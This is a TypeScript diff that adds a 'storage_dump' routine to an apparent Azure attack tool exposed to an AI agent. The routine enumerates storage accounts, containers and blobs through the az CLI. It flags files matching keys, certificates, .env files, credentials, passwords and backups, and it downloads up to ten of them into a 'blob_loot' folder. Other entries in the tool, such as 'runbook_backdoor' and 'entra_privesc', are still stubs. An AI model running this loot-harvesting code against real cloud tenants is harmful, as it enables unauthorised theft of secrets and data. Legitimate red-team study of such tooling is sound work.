@@ -189,6 +189,46 @@ async function keyvaultDump(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings: [] }
 }
 
+async function storageDump(args: string[], timeout: number): Promise<HookResult> {
+  const accountName = argVal(args, "--account-name")
+  const container = argVal(args, "--container")
+  const pattern = argVal(args, "--pattern")
+  const download = hasFlag(args, "--download")
+  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup"
+
+  if (accountName && container) {
+    const r = await run("az", ["storage", "blob", "list", "--account-name", accountName, "--container-name", container, "--query", "[].name", "-o", "json"], timeout)
+    if (r.exitCode !== 0) return { output: `[-] Cannot list blobs: ${r.stderr.trim()}`, findings: [] }
+    const blobs = (tryJson(r.stdout) || []) as string[]
+    const sensitive = blobs.filter(b => new RegExp(sensitivePattern, "i").test(b))
+    const output = [`[*] Container: ${accountName}/${container}`, `[+] Total blobs: ${blobs.length}`, `[+] Sensitive: ${sensitive.length}`]
+    for (const b of sensitive) output.push(`    ${b}`)
+    if (download && sensitive.length > 0) {
+      for (const b of sensitive.slice(0, 10)) {
+        const dl = await run("az", ["storage", "blob", "download", "--account-name", accountName, "--container-name", container, "--name", b, "--file", `./blob_loot/${b.split("/").pop()}`, "--no-progress"], timeout)
+        output.push(dl.exitCode === 0 ? `    Downloaded: ${b}` : `    Failed: ${b}`)
+      }
+    }
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  if (accountName) {
+    const r = await run("az", ["storage", "container", "list", "--account-name", accountName, "--query", "[].{name:name,access:properties.publicAccess}", "-o", "json"], timeout)
+    if (r.exitCode !== 0) return { output: `[-] Cannot list containers: ${r.stderr.trim()}`, findings: [] }
+    const containers = tryJson(r.stdout) || []
+    const output = [`[*] Storage account: ${accountName}`, `[+] Containers: ${containers.length}`]
+    for (const c of containers) output.push(`    ${c.name} (access: ${c.access || "private"})`)
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  const accts = await run("az", ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}", "-o", "json"], timeout)
+  if (accts.exitCode !== 0) return { output: `[-] Cannot list storage accounts: ${accts.stderr.trim()}`, findings: [] }
+  const al = tryJson(accts.stdout) || []
+  const output = [`[*] Found ${al.length} storage account(s)\n`]
+  for (const a of al) output.push(`[+] ${a.name} (rg: ${a.rg})`)
+  return { output: output.join("\n"), findings: [] }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
@@ -221,7 +261,7 @@ export const AzurehookTool = Tool.define("azurehook", {
       entra_enum: () => entraEnum(params.args, params.timeout_seconds),
       entra_privesc: () => entraPrivesc(params.args, params.timeout_seconds),
       keyvault_dump: () => keyvaultDump(params.args, params.timeout_seconds),
-      storage_dump: () => stub("storage_dump"),
+      storage_dump: () => storageDump(params.args, params.timeout_seconds),
       managed_identity: () => stub("managed_identity"),
       runbook_backdoor: () => stub("runbook_backdoor"),
       azuread_token: () => stub("azuread_token"),
